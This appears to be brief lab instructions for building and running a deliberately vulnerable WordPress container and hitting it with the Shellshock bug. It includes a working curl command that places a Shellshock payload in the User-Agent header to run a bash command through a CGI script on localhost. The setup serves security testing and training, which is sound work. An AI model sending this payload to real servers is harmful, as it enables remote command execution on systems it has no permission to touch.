docker build -t wordpress-shellshock .

docker run -d -p 8080:80 --name vulnerable-wordpress wordpress-shellshock

To exploit:
	curl -H "User-Agent: () { :; }; /bin/bash -c 'COMMAND'" http://localhost:8080/cgi-bin/vulnerable.sh
